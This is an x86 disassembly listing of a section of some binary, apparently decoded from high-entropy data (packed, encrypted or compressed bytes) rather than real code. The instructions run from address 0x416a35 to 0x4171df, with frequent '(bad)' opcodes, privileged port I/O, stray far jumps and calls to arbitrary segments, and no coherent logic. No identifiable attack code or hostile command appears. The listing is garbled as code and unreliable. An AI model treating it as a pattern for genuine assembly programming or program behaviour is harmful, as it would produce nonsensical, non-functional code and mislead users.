  416a35:	or     al,0x6a
  416a37:	inc    esp
  416a38:	shr    DWORD PTR [esp+ebx*2],0x65
  416a3c:	jns    0x416aa6
  416a3e:	popf   
  416a3f:	iret   
  416a40:	xor    al,BYTE PTR fs:[eax+edi*1]
  416a44:	pop    edi
  416a45:	inc    ebx
  416a46:	(bad)  
  416a47:	ficomp WORD PTR [edx]
  416a49:	retf   0xa1e3
  416a4c:	lahf   
  416a4d:	arpl   WORD PTR [ebp-0x6d],cx
  416a50:	dec    esp
  416a51:	add    eax,0xf87f53d7
  416a56:	mov    al,0x14
  416a58:	xor    ebx,DWORD PTR [esi+eax*2+0x62]
  416a5c:	in     al,dx
  416a5d:	inc    eax
  416a5e:	stos   BYTE PTR es:[edi],al
  416a5f:	repnz lock mov cl,0x51
  416a63:	inc    esp
  416a64:	inc    ebx
  416a65:	pop    esp
  416a66:	mov    ebx,DWORD PTR [edx]
  416a68:	mov    al,0x4b
  416a6a:	rcl    ch,cl
  416a6c:	adc    BYTE PTR [edi],al
  416a6e:	and    BYTE PTR [edx-0x63],al
  416a71:	outs   dx,BYTE PTR ds:[esi]
  416a72:	in     eax,dx
  416a73:	fcmovbe st,st(5)
  416a75:	push   cs
  416a76:	cmp    ecx,esp
  416a78:	inc    edx
  416a79:	fs push 0x81198575
  416a7f:	mov    bl,0xfd
  416a81:	(bad)  
  416a82:	mov    esi,0x7b6123a0
  416a87:	or     eax,0x2abc05d1
  416a8c:	daa    
  416a8d:	retf   0x5865
  416a90:	jb     0x416a3b
  416a92:	sbb    al,0x92
  416a94:	push   esp
  416a95:	cdq    
  416a96:	jns    0x416a1e
  416a98:	mov    edi,DWORD PTR [edi+0x5b]
  416a9b:	ja     0x416abf
  416a9d:	es cmp eax,0x47407ac7
  416aa3:	aaa    
  416aa4:	pop    ss
  416aa5:	cli    
  416aa6:	pusha  
  416aa7:	xchg   edi,eax
  416aa8:	rol    cl,1
  416aaa:	lods   eax,DWORD PTR ds:[esi]
  416aab:	cld    
  416aac:	jge    0x416a66
  416aae:	fdiv   DWORD PTR [ebx]
  416ab0:	pop    es
  416ab1:	xchg   ecx,eax
  416ab2:	mov    ebx,0x63f38b40
  416ab7:	ret    0xe0c0
  416aba:	jb     0x416a7c
  416abc:	out    0xe5,eax
  416abe:	pop    edi
  416abf:	jge    0x416a9e
  416ac1:	mov    dh,0xb4
  416ac3:	outs   dx,BYTE PTR ds:[esi]
  416ac4:	pop    esi
  416ac5:	std    
  416ac6:	and    al,0x44
  416ac8:	xchg   DWORD PTR [eax],ebx
  416aca:	mov    ecx,0xea110a76
  416acf:	loopne 0x416a67
  416ad1:	aas    
  416ad2:	out    dx,al
  416ad3:	jmp    0x416af2
  416ad5:	inc    ebx
  416ad6:	arpl   WORD PTR [ebx],dx
  416ad8:	cli    
  416ad9:	lahf   
  416ada:	int    0x0
  416adc:	and    cl,al
  416ade:	call   0xe2dd:0x36323660
  416ae5:	dec    eax
  416ae6:	lods   eax,DWORD PTR ds:[esi]
  416ae7:	clc    
  416ae8:	and    eax,0x9f194c81
  416aed:	pusha  
  416aee:	call   DWORD PTR [ebp+0x2a8e0a55]
  416af4:	add    eax,0x66a2a99a
  416af9:	out    dx,al
  416afa:	pusha  
  416afb:	pop    ss
  416afc:	ds mov esi,0x5b26a592
  416b02:	sbb    edx,edi
  416b04:	bound  esp,QWORD PTR [ebp+0x3310a6f3]
  416b0a:	test   eax,0x16aa11f2
  416b0f:	(bad)  
  416b10:	das    
  416b11:	or     eax,DWORD PTR [edi+0x6afe1e07]
  416b17:	int3   
  416b18:	pop    ds
  416b19:	jo     0x416b75
  416b1b:	loope  0x416b1f
  416b1d:	cs dec edi
  416b1f:	out    0x50,al
  416b21:	mov    dh,0xfa
  416b23:	sub    al,0xb6
  416b25:	ficom  DWORD PTR [edi-0x65d5091d]
  416b2b:	test   al,0x91
  416b2d:	cmp    eax,0x6ab49458
  416b32:	or     ch,BYTE PTR [ecx+0x23]
  416b35:	inc    ecx
  416b36:	daa    
  416b37:	scas   al,BYTE PTR es:[edi]
  416b38:	bnd jns 0x416b2c
  416b3b:	cmp    ebx,ecx
  416b3d:	fld    QWORD PTR [eax+0x19]
  416b40:	add    ebp,edi
  416b42:	leave  
  416b43:	dec    edx
  416b44:	sbb    BYTE PTR [esi+ebx*8-0x31],ah
  416b48:	es repz jno 0x416b16
  416b4c:	push   0xbf2ddfbb
  416b51:	popf   
  416b52:	ja     0x416af8
  416b54:	jns    0x416ae1
  416b56:	leave  
  416b57:	mov    edx,0x6090a51f
  416b5c:	ins    BYTE PTR es:[edi],dx
  416b5d:	lock cmp edi,edi
  416b60:	add    ebx,edx
  416b62:	jp     0x416bdc
  416b64:	mov    esi,ecx
  416b66:	pop    ebp
  416b67:	aam    0xbe
  416b69:	(bad)
  416b6c:	mov    eax,0x59412633
  416b71:	xor    BYTE PTR [edi+0x1e],dh
  416b74:	add    edx,DWORD PTR [eax+0x52]
  416b77:	icebp  
  416b78:	pop    edi
  416b79:	xor    eax,0xa00182dd
  416b7e:	inc    ecx
  416b7f:	arpl   si,bp
  416b81:	lea    edx,[esi+0x1591418a]
  416b87:	cmp    al,0x10
  416b89:	cwde   
  416b8a:	ja     0x416bbc
  416b8c:	jp     0x416b5e
  416b8e:	mov    ch,0x2b
  416b90:	hlt    
  416b91:	sti    
  416b92:	mov    ?,WORD PTR [eax+eax*4-0x6044380a]
  416b99:	repnz loopne 0x416b8f
  416b9c:	in     al,dx
  416b9d:	or     al,0xc0
  416b9f:	jmp    0x7d0b:0x8798289c
  416ba6:	sbb    esp,esp
  416ba8:	mov    WORD PTR [esi+0x18e6d376],fs
  416bae:	cs into 
  416bb0:	test   eax,0xbe7a58ae
  416bb5:	cmp    eax,DWORD PTR [edi+0x55]
  416bb8:	cwde   
  416bb9:	jo     0x416bb5
  416bbb:	dec    edx
  416bbc:	scas   al,BYTE PTR es:[edi]
  416bbd:	sbb    edi,eax
  416bbf:	mov    WORD PTR [edi-0x26],es
  416bc2:	xor    DWORD PTR [eax],ebx
  416bc4:	sub    eax,0x5912f4e1
  416bc9:	test   BYTE PTR [eax+ecx*2],dl
  416bcc:	cs out 0x2e,al
  416bcf:	dec    esi
  416bd0:	into   
  416bd1:	retf   0xc15a
  416bd4:	mov    esi,0xa747cfb0
  416bd9:	nop
  416bda:	cld    
  416bdb:	ins    BYTE PTR es:[edi],dx
  416bdc:	enter  0xa715,0xc4
  416be0:	loop   0x416b8f
  416be2:	or     edx,esi
  416be4:	loope  0x416bd0
  416be6:	popa   
  416be7:	stos   DWORD PTR es:[edi],eax
  416be8:	mov    gs,ebx
  416bea:	push   0x6d
  416bec:	pop    ss
  416bed:	adc    DWORD PTR [edx-0x46],esi
  416bf0:	test   BYTE PTR [ebx+ebp*2-0x39],ch
  416bf4:	add    DWORD PTR [edx],ebx
  416bf6:	mov    ch,0xd0
  416bf8:	call   0x654b997f
  416bfd:	fcmovnbe st,st(6)
  416bff:	sbb    al,0xe2
  416c01:	adc    BYTE PTR [eax+0x42],cl
  416c04:	add    DWORD PTR [esi],ebp
  416c06:	push   cs
  416c07:	cli    
  416c08:	sbb    ah,dh
  416c0a:	daa    
  416c0b:	outs   dx,BYTE PTR ds:[esi]
  416c0c:	jmp    0x416c0c
  416c0e:	loop   0x416c40
  416c10:	loop   0x416c3e
  416c12:	retf   0x7b60
  416c15:	jne    0x416c51
  416c17:	mov    gs,WORD PTR [eax]
  416c19:	and    BYTE PTR [edi+0x3791e2be],dl
  416c1f:	jle    0x416c5d
  416c21:	or     al,0x7e
  416c23:	pop    ebp
  416c24:	jb     0x416c01
  416c26:	sbb    dl,al
  416c28:	out    dx,eax
  416c29:	pop    esp
  416c2a:	push   ecx
  416c2b:	xchg   edi,eax
  416c2c:	push   esp
  416c2d:	and    al,0x32
  416c2f:	loopne 0x416c29
  416c31:	adc    al,0x3d
  416c33:	xor    ebx,DWORD PTR [ecx+0x1c]
  416c36:	idiv   DWORD PTR [eax+0x1d]
  416c39:	dec    eax
  416c3a:	xor    edx,ebx
  416c3c:	and    dh,BYTE PTR [ebx]
  416c3e:	leave  
  416c3f:	scas   eax,DWORD PTR es:[edi]
  416c40:	lock jae 0x416c9b
  416c43:	mov    BYTE PTR gs:[esi+0x585328ad],ch
  416c4a:	jl     0x416c68
  416c4c:	add    ah,BYTE PTR [edi]
  416c4e:	mov    eax,0x1de50341
  416c53:	or     al,0xb
  416c55:	popa   
  416c56:	hlt    
  416c57:	xor    BYTE PTR [eax+0x56],al
  416c5a:	jmp    0xf91d:0x258a1f29
  416c61:	mov    dh,0x1a
  416c63:	mov    BYTE PTR [edx],dl
  416c65:	sub    edx,DWORD PTR [ebx-0x52cac750]
  416c6b:	mov    edi,0xb5593475
  416c70:	adc    BYTE PTR [eax],dl
  416c72:	cmp    eax,0x8a010c7a
  416c77:	mov    ebx,0xfaeecf06
  416c7c:	dec    esi
  416c7d:	ds popf 
  416c7f:	mov    dh,0x13
  416c81:	sub    ecx,DWORD PTR [edx-0x14]
  416c84:	loopne 0x416ce5
  416c86:	cwde   
  416c87:	icebp  
  416c88:	leave  
  416c89:	mov    al,ds:0x17ac4580
  416c8e:	jno    0x416d02
  416c90:	lea    edx,[eax-0x497806e0]
  416c96:	(bad)  
  416c97:	and    BYTE PTR [ebp-0xd],bh
  416c9a:	aas    
  416c9b:	dec    edi
  416c9c:	cli    
  416c9d:	xchg   edi,eax
  416c9e:	(bad)  [ebp-0x3b]
  416ca1:	add    BYTE PTR [ebx+0x10],al
  416ca4:	xchg   ebx,eax
  416ca5:	pusha  
  416ca6:	clc    
  416ca7:	test   al,0xbd
  416ca9:	push   0x83136df5
  416cae:	mov    BYTE PTR [edi+esi*4-0x43c5986a],al
  416cb5:	inc    BYTE PTR [esi]
  416cb7:	mov    ebx,0xe024d56d
  416cbc:	jmp    0x416cb7
  416cbe:	ja     0x416c93
  416cc0:	ins    BYTE PTR es:[edi],dx
  416cc1:	push   ds
  416cc2:	in     eax,dx
  416cc3:	mov    ebx,0x6efea433
  416cc8:	mov    ah,0xcb
  416cca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ccb:	inc    esi
  416ccc:	ret    
  416ccd:	lahf   
  416cce:	dec    ecx
  416ccf:	xor    dl,0xbe
  416cd2:	xor    eax,0x7d498886
  416cd7:	push   edi
  416cd8:	imul   ebx,eax,0xfffffff6
  416cdb:	push   ebp
  416cdc:	imul   ecx,edi,0x4169381d
  416ce2:	(bad)  
  416ce3:	lds    ebp,FWORD PTR [esi+0x4b036c36]
  416ce9:	(bad)  
  416cea:	ins    DWORD PTR es:[edi],dx
  416ceb:	adc    ah,0xda
  416cee:	lods   al,BYTE PTR ds:[esi]
  416cef:	test   BYTE PTR [esi],al
  416cf1:	test   DWORD PTR ds:0x1204b5df,eax
  416cf7:	hlt    
  416cf8:	sub    edi,DWORD PTR [ebp-0x2e]
  416cfb:	pop    esi
  416cfc:	pop    ecx
  416cfd:	les    esp,FWORD PTR [ecx-0x523dd00]
  416d03:	add    ah,BYTE PTR [edi+0x3d6f25c7]
  416d09:	sbb    al,dl
  416d0b:	int3   
  416d0c:	pop    edi
  416d0d:	sbb    al,0xbe
  416d0f:	push   ds
  416d10:	xchg   ebx,eax
  416d11:	rol    DWORD PTR [esi+esi*1],1
  416d14:	mov    eax,ds:0x5ba2ca54
  416d19:	jmp    0x416cba
  416d1b:	sti    
  416d1c:	(bad)
  416d21:	add    edi,eax
  416d23:	enter  0xe016,0x18
  416d27:	lahf   
  416d28:	and    BYTE PTR [esi],ah
  416d2a:	adc    esp,edi
  416d2c:	pop    esp
  416d2d:	push   0xa26c772a
  416d32:	sub    ecx,DWORD PTR [ebx+ecx*2+0x3f]
  416d36:	push   es
  416d37:	inc    edi
  416d38:	and    eax,0xbcf4cc69
  416d3d:	mov    dh,0xe9
  416d3f:	mov    ecx,0x74734f3c
  416d44:	fidivr WORD PTR [edi-0x66c8b625]
  416d4a:	gs fwait
  416d4c:	mov    edi,0x9de25a4a
  416d51:	jge    0x416d9f
  416d53:	xchg   BYTE PTR [edx-0x73],bl
  416d56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d57:	cmp    DWORD PTR [ecx+ebx*8-0x128240d9],esi
  416d5e:	jl     0x416d12
  416d60:	push   ds
  416d61:	iret   
  416d62:	add    esi,ecx
  416d64:	bound  edi,QWORD PTR [ebp+0x1cd239bb]
  416d6a:	in     eax,dx
  416d6b:	out    dx,eax
  416d6c:	int    0x1
  416d6e:	in     al,dx
  416d6f:	mov    al,0xb5
  416d71:	pop    edx
  416d72:	jg     0x416db4
  416d74:	cwde   
  416d75:	xor    ah,BYTE PTR ss:0x7ae04132
  416d7c:	aaa    
  416d7d:	inc    DWORD PTR [ebx-0x42ac8902]
  416d83:	mov    edx,0x11d542d
  416d88:	stos   BYTE PTR es:[edi],al
  416d89:	ror    BYTE PTR [ebp+0x18],0xe6
  416d8d:	and    al,BYTE PTR [ebx+0x705a58ab]
  416d93:	cmp    eax,0xf9e729a1
  416d98:	dec    ebp
  416d99:	jmp    0x8c21:0xb7359214
  416da0:	retf   0xb6ab
  416da3:	hlt    
  416da4:	mov    cl,0x54
  416da6:	dec    esp
  416da7:	push   ebx
  416da8:	dec    ecx
  416da9:	frstor [eax-0x4eb2c099]
  416daf:	mov    esp,0xcf98b9a6
  416db4:	outs   dx,DWORD PTR ds:[esi]
  416db5:	mov    al,ds:0xa02d9231
  416dba:	loopne 0x416d67
  416dbc:	sub    al,0x59
  416dbe:	jge    0x416d46
  416dc0:	call   0xf5865424
  416dc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dc6:	scas   al,BYTE PTR es:[edi]
  416dc7:	imul   DWORD PTR [ebp-0x8]
  416dca:	loop   0x416e09
  416dcc:	cmp    bh,BYTE PTR [ebp-0x67]
  416dcf:	test   BYTE PTR [ebx],bl
  416dd1:	les    ebx,FWORD PTR [edx-0x1c]
  416dd4:	call   FWORD PTR [ebx+0x3d]
  416dd7:	xor    eax,0x9706a7f9
  416ddc:	inc    edi
  416ddd:	push   0x6517aef7
  416de2:	cmp    edx,DWORD PTR [edi-0x30]
  416de5:	aaa    
  416de6:	pop    ss
  416de7:	cs push ss
  416de9:	push   0x5
  416deb:	loop   0x416dff
  416ded:	xchg   DWORD PTR [eax+0x16],ebx
  416df0:	or     BYTE PTR [edx+0x7a],bl
  416df3:	out    0xea,al
  416df5:	dec    esp
  416df6:	pop    ebx
  416df7:	and    dl,BYTE PTR [ebp+0x4a]
  416dfa:	addr16 aaa 
  416dfc:	sub    BYTE PTR [ecx],0x24
  416dff:	loope  0x416d89
  416e01:	sub    DWORD PTR [esi+0x51],edx
  416e04:	and    ebp,edx
  416e06:	adc    al,0xa1
  416e08:	rcl    BYTE PTR [edx+0x41],1
  416e0b:	call   0x2baebac9
  416e10:	sti    
  416e11:	push   edx
  416e12:	pop    es
  416e13:	rol    bh,0x65
  416e16:	inc    edx
  416e17:	push   eax
  416e18:	push   0x3a
  416e1a:	sti    
  416e1b:	gs dec ebx
  416e1d:	add    al,BYTE PTR [eax+esi*8]
  416e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e21:	shl    DWORD PTR [eax+eiz*8-0x7c],cl
  416e25:	call   0xb144:0x2b2b1374
  416e2c:	add    DWORD PTR [ecx],ebx
  416e2e:	cdq    
  416e2f:	xchg   ebx,eax
  416e30:	dec    eax
  416e31:	mov    cl,0x9c
  416e33:	(bad)  
  416e34:	in     al,dx
  416e35:	retf   
  416e36:	aad    0x4a
  416e38:	lods   al,BYTE PTR ds:[esi]
  416e39:	pop    ebx
  416e3a:	sbb    DWORD PTR [ebp-0x42a10986],eax
  416e40:	outs   dx,BYTE PTR ds:[esi]
  416e41:	(bad)  
  416e42:	(bad)  
  416e44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e45:	stos   BYTE PTR es:[edi],al
  416e46:	mov    WORD PTR [ebx+0x35],fs
  416e49:	inc    ebp
  416e4a:	iret   
  416e4b:	mov    ebx,0x5afc53ce
  416e50:	pop    eax
  416e51:	sti    
  416e52:	call   0x384bbc42
  416e57:	je     0x416e06
  416e59:	xchg   ebp,eax
  416e5a:	sbb    esp,eax
  416e5c:	icebp  
  416e5d:	xchg   ebp,eax
  416e5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e5f:	test   DWORD PTR [ebx],0x6e265bfa
  416e65:	fwait
  416e66:	push   ds
  416e67:	sbb    esi,esi
  416e69:	lods   al,BYTE PTR ds:[esi]
  416e6a:	sub    ebp,DWORD PTR [ecx-0xe]
  416e6d:	xlat   BYTE PTR ds:[ebx]
  416e6e:	add    DWORD PTR [esi+0x45],0x6faa32e3
  416e75:	mov    ds:0xcee11522,eax
  416e7a:	stos   DWORD PTR es:[edi],eax
  416e7b:	mov    al,ds:0x46aeec4c
  416e80:	dec    ebp
  416e81:	add    DWORD PTR [edx+0x14],0x34d4fc15
  416e88:	mov    bl,0x87
  416e8a:	cli    
  416e8b:	(bad)  
  416e8c:	aam    0x83
  416e8e:	add    esp,esi
  416e90:	in     eax,0x6f
  416e92:	mov    DWORD PTR [edx+ecx*2-0x1bee8493],ecx
  416e99:	add    DWORD PTR [edi-0x76],esi
  416e9c:	and    BYTE PTR fs:[esi-0x71],ch
  416ea0:	or     DWORD PTR [esi+eax*2],0xffffffbf
  416ea4:	ins    DWORD PTR es:[edi],dx
  416ea5:	jns    0x416ed6
  416ea7:	cld    
  416ea8:	ret    
  416ea9:	push   ds
  416eaa:	mov    ds:0x4d676f45,eax
  416eaf:	mov    ds:0xa769bb71,eax
  416eb4:	add    ch,BYTE PTR [edi+0x34]
  416eb7:	pop    ebx
  416eb8:	cmp    al,0xaf
  416eba:	ja     0x416e4e
  416ebc:	dec    edi
  416ebd:	cmp    ch,BYTE PTR [esi+eiz*2+0x39]
  416ec1:	cld    
  416ec2:	mov    ds:0xf8af9d93,al
  416ec7:	aaa    
  416ec8:	shl    DWORD PTR [ecx+edx*2-0x8f2e840],1
  416ecf:	xlat   BYTE PTR ds:[ebx]
  416ed0:	es fwait
  416ed2:	imul   ebx,DWORD PTR [edx+0x14],0xffffffa2
  416ed6:	(bad)  
  416ed7:	mov    cl,0xa4
  416ed9:	imul   ebp,DWORD PTR ds:0x73c61741,0x2a
  416ee0:	cmp    DWORD PTR [ecx-0x30],ebp
  416ee3:	out    dx,al
  416ee4:	mov    edi,0xd08fddd2
  416ee9:	movnti DWORD PTR [eax+0x50],esp
  416eed:	scas   eax,DWORD PTR es:[edi]
  416eee:	xor    ah,ch
  416ef0:	stos   DWORD PTR es:[edi],eax
  416ef1:	jl     0x416eaf
  416ef3:	jno    0x416ee9
  416ef5:	mov    ch,0x9b
  416ef7:	xchg   BYTE PTR [eax+esi*8+0x46afbc61],dh
  416efe:	rol    ah,0x5c
  416f01:	icebp  
  416f02:	ja     0x416f20
  416f04:	data16 int3 
  416f06:	sub    bl,BYTE PTR [ebp+eax*4+0x26]
  416f0a:	and    al,0xf1
  416f0c:	push   0x230949f5
  416f11:	xor    dh,BYTE PTR [edx]
  416f13:	mov    al,ds:0x43483a55
  416f18:	xor    DWORD PTR [eax],ecx
  416f1a:	js     0x416f1b
  416f1c:	adc    ebx,ecx
  416f1e:	jl     0x416f37
  416f20:	js     0x416f68
  416f22:	fnstcw WORD PTR [ecx-0x696c6e9]
  416f28:	push   edi
  416f29:	mov    ds:0xd7869fea,eax
  416f2e:	and    eax,0x17775788
  416f33:	inc    ebx
  416f34:	pop    ds
  416f35:	(bad)  
  416f36:	icebp  
  416f37:	std    
  416f38:	sbb    eax,0x6bc386df
  416f3d:	and    eax,0xd855cacd
  416f42:	lahf   
  416f43:	cdq    
  416f44:	push   eax
  416f45:	sbb    eax,0xab99ab90
  416f4a:	mov    ecx,0xac0f7ee1
  416f4f:	inc    ebp
  416f50:	xor    al,0xc8
  416f52:	call   0x61bf1077
  416f57:	jle    0x416ee2
  416f59:	popf   
  416f5a:	or     BYTE PTR [ecx],ch
  416f5c:	pop    ebx
  416f5d:	(bad)  
  416f5e:	mov    al,ds:0xabd8331c
  416f63:	xchg   edi,eax
  416f64:	addr16 sbb ax,0x795d
  416f69:	in     al,dx
  416f6a:	stos   BYTE PTR es:[edi],al
  416f6b:	(bad)  
  416f6c:	cmp    ebp,edx
  416f6e:	lea    ebx,[ecx+0x2e913e19]
  416f74:	int    0x6e
  416f76:	into   
  416f77:	test   eax,0x940db3f0
  416f7c:	mov    dl,ch
  416f7e:	pop    ebx
  416f7f:	mov    edx,0xd75bee87
  416f84:	rcr    BYTE PTR [edi],1
  416f86:	scas   al,BYTE PTR es:[edi]
  416f87:	pmaxsw mm6,QWORD PTR [esi+ebx*8-0x7a]
  416f8c:	mov    ds:0x2d880156,al
  416f91:	mov    bl,0xb3
  416f93:	out    dx,eax
  416f94:	gs clc 
  416f96:	jge    0x416faa
  416f98:	shl    BYTE PTR [edx-0x9],1
  416f9b:	jmp    0xb251:0x55cb950c
  416fa2:	shr    ebp,1
  416fa4:	fwait
  416fa5:	lock jbe 0x416f5b
  416fa8:	push   cs
  416fa9:	in     eax,0x6b
  416fab:	xchg   edx,eax
  416fac:	or     dh,ah
  416fae:	mov    esp,0x7c7afbb2
  416fb3:	push   esi
  416fb4:	icebp  
  416fb5:	repnz or DWORD PTR [ecx+0x3c],edi
  416fb9:	dec    edi
  416fba:	mov    dl,BYTE PTR [esi-0x19690e15]
  416fc0:	lods   eax,DWORD PTR ds:[esi]
  416fc1:	push   0x5d416e7a
  416fc6:	adc    ecx,edx
  416fc8:	xchg   esp,eax
  416fc9:	and    dh,ch
  416fcb:	stc    
  416fcc:	xor    eax,0xf9cb4827
  416fd1:	xor    BYTE PTR [eax+0x6e],ah
  416fd4:	popf   
  416fd5:	out    dx,eax
  416fd6:	cwde   
  416fd7:	and    eax,0xb2a676d6
  416fdc:	push   esp
  416fdd:	hlt    
  416fde:	test   eax,0x9a1ccc0e
  416fe3:	xor    esp,ecx
  416fe5:	sbb    ebp,esi
  416fe7:	dec    esp
  416fe8:	mov    bh,BYTE PTR [esi]
  416fea:	push   0x51
  416fec:	(bad)  
  416fed:	int    0x49
  416fef:	popa   
  416ff0:	rcl    DWORD PTR [esi-0x70],cl
  416ff3:	out    dx,al
  416ff4:	mov    DWORD PTR [ecx+0x6dcfc95d],ebx
  416ffa:	mov    ebp,0x8c14f654
  416fff:	adc    al,0x85
  417001:	popf   
  417002:	inc    ebx
  417003:	sbb    BYTE PTR ds:0xfd8c4e8f,dl
  417009:	std    
  41700a:	add    DWORD PTR [esi],edx
  41700c:	into   
  41700d:	xchg   edi,eax
  41700e:	aas    
  41700f:	rol    DWORD PTR [edx+0x728f6213],1
  417015:	shl    DWORD PTR [esi],0x5a
  417018:	mov    eax,0xcc91613d
  41701d:	sbb    esp,edx
  41701f:	add    al,BYTE PTR [eax]
  417021:	loop   0x416fdf
  417023:	cmp    DWORD PTR [edi],esp
  417025:	mov    DWORD PTR [eax-0x72],0xa52e21f3
  41702c:	adc    al,0xb2
  41702e:	clc    
  41702f:	sbb    eax,0xd37f69fa
  417034:	jecxz  0x4170ae
  417036:	and    DWORD PTR [esi],edx
  417038:	mov    dl,0xe7
  41703a:	(bad)  
  41703b:	mov    dl,0xef
  41703d:	outs   dx,BYTE PTR ds:[esi]
  41703e:	fs (bad) 
  417040:	adc    edi,DWORD PTR [edi-0x4a]
  417043:	push   es
  417044:	inc    eax
  417045:	bound  ebx,QWORD PTR [eax+0x5f]
  417048:	or     BYTE PTR [ecx+0x14],ah
  41704b:	int    0xd4
  41704d:	xchg   edx,eax
  41704e:	(bad)  
  41704f:	rcr    BYTE PTR [eax+0x47],1
  417052:	cwde   
  417053:	mov    ebx,0xbfd035c8
  417058:	call   0xf6c43af6
  41705d:	mov    ebx,0x4e94269f
  417062:	retf   
  417063:	mov    edi,0xec72c902
  417068:	not    DWORD PTR [edi+esi*2-0x62]
  41706c:	scas   eax,DWORD PTR es:[edi]
  41706d:	dec    ebp
  41706e:	add    edx,ebx
  417070:	adc    edi,0x408cec78
  417076:	imul   edi,DWORD PTR cs:[edx],0xffffffc6
  41707a:	add    eax,0x5aeab42e
  41707f:	(bad)  
  417080:	lods   al,BYTE PTR es:[esi]
  417082:	inc    edi
  417083:	sahf   
  417084:	add    BYTE PTR [ebx+esi*8],bh
  417087:	setae  BYTE PTR [ebx]
  41708a:	aaa    
  41708b:	ins    DWORD PTR es:[edi],dx
  41708c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41708d:	add    ax,0x24a3
  417091:	ds dec edx
  417093:	pop    esi
  417094:	mov    eax,ds:0x59571b82
  417099:	mov    dl,BYTE PTR [edi+0x425171d5]
  41709f:	icebp  
  4170a0:	sahf   
  4170a1:	ret    
  4170a2:	ficom  DWORD PTR [edi-0x30f7faa]
  4170a8:	push   edx
  4170a9:	pop    ebp
  4170aa:	push   esi
  4170ab:	xchg   ebx,eax
  4170ac:	mov    esi,DWORD PTR [edx-0x1e94274b]
  4170b2:	xchg   BYTE PTR [eax+0x39],ch
  4170b5:	out    dx,al
  4170b6:	xor    BYTE PTR [esi-0x27dd7a37],0x6d
  4170bd:	in     eax,0xe2
  4170bf:	loope  0x4170b6
  4170c1:	push   0x796a500c
  4170c6:	sub    ch,BYTE PTR [edx-0x27]
  4170c9:	cmp    BYTE PTR [edx+0x30],bl
  4170cc:	jnp    0x41705c
  4170ce:	push   ss
  4170cf:	inc    ebp
  4170d0:	mov    esp,0xd30938c0
  4170d5:	jb     0x4170ae
  4170d7:	xor    ch,BYTE PTR [ebx-0x10dd4665]
  4170dd:	lea    ecx,[ecx]
  4170df:	and    eax,0xac4f3af5
  4170e4:	xchg   esi,eax
  4170e5:	test   eax,0xc945b6ee
  4170ea:	rcr    DWORD PTR [eax+0x68],0x89
  4170ee:	push   eax
  4170ef:	add    eax,0x536fab77
  4170f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170f5:	stos   BYTE PTR es:[edi],al
  4170f6:	push   edx
  4170f7:	adc    eax,0x808f0cc2
  4170fc:	out    0x5f,eax
  4170fe:	or     al,0xe
  417100:	addr16 aad 0x89
  417103:	ja     0x417118
  417105:	xchg   esp,eax
  417106:	lods   al,BYTE PTR ds:[esi]
  417107:	pop    edi
  417108:	xor    BYTE PTR [esi],bh
  41710a:	fnstcw WORD PTR [edx-0x7ee97223]
  417110:	jae    0x417160
  417112:	retf   
  417113:	and    eax,DWORD PTR [ebp-0x47297702]
  417119:	popf   
  41711a:	push   esp
  41711b:	sub    BYTE PTR [ecx],dh
  41711d:	pop    eax
  41711e:	lds    ebp,FWORD PTR gs:[ebp+0x30b0ae91]
  417125:	and    BYTE PTR [ebp-0x3e],ch
  417128:	mov    ah,0x31
  41712a:	fidivr WORD PTR [ebx-0x74]
  41712d:	push   ebx
  41712e:	jle    0x417195
  417130:	cdq    
  417131:	call   0x4edf:0x409b0c40
  417138:	dec    eax
  417139:	xchg   esi,eax
  41713a:	aam    0xf1
  41713c:	sub    edi,ecx
  41713e:	xchg   ebp,eax
  41713f:	icebp  
  417140:	ret    0xdf0a
  417143:	xor    dl,BYTE PTR [esi]
  417145:	and    edx,DWORD PTR [edx]
  417147:	mov    al,0x59
  417149:	adc    esi,DWORD PTR [eax]
  41714b:	cwde   
  41714c:	in     eax,0x28
  41714e:	in     al,0x1b
  417150:	out    0xcb,eax
  417152:	pop    edi
  417153:	add    BYTE PTR [edi],ch
  417155:	rcr    bh,1
  417157:	ret    0xa0fa
  41715a:	xchg   DWORD PTR [ebx+0x6935f52e],edi
  417160:	out    0x6a,al
  417162:	sub    DWORD PTR [edi+0x62220ff2],0x36
  417169:	jne    0x41710f
  41716b:	mov    eax,0x8a1a41d4
  417170:	out    0xca,eax
  417172:	scas   eax,DWORD PTR es:[edi]
  417173:	mov    BYTE PTR ss:[ebp+0xe],ah
  417177:	ins    DWORD PTR es:[edi],dx
  417178:	mov    DWORD PTR [eax],ecx
  41717a:	fcom   DWORD PTR [ebp+0x220ea921]
  417180:	and    ebx,DWORD PTR [eax-0x8]
  417183:	in     eax,dx
  417184:	sub    ah,BYTE PTR [ecx+edx*4+0x15]
  417188:	pop    eax
  417189:	push   esi
  41718a:	lods   al,BYTE PTR ds:[esi]
  41718b:	dec    esi
  41718c:	div    DWORD PTR [ebp-0xf47be7a]
  417192:	sahf   
  417193:	pop    ebx
  417194:	jmp    0xb2f8:0xbb3a0763
  41719b:	enter  0x8d8b,0x3f
  41719f:	inc    ebx
  4171a0:	push   0xa4337411
  4171a5:	xor    edi,eax
  4171a7:	and    BYTE PTR [esi+0x49e8fc6c],0xef
  4171ae:	pop    eax
  4171af:	shl    DWORD PTR [ecx+edx*2],0x1d
  4171b3:	sbb    ebx,DWORD PTR [ebx+eiz*1+0x15]
  4171b7:	inc    esi
  4171b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171ba:	jecxz  0x41713e
  4171bc:	fcom   QWORD PTR [ebx-0x7f]
  4171bf:	push   esi
  4171c0:	aaa    
  4171c1:	out    0xe6,eax
  4171c3:	add    eax,0x107242df
  4171c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171c9:	xchg   edi,eax
  4171ca:	(bad)  
  4171cc:	arpl   WORD PTR [ecx],bp
  4171ce:	jmp    0x417195
  4171d0:	rol    BYTE PTR [bp+si],cl
  4171d3:	jnp    0x4171fe
  4171d5:	push   0x4848f82d
  4171da:	jnp    0x4171fb
  4171dc:	adc    DWORD PTR [ecx-0x1e],esp
  4171df:	addr16 jmp 0xeb78ac12
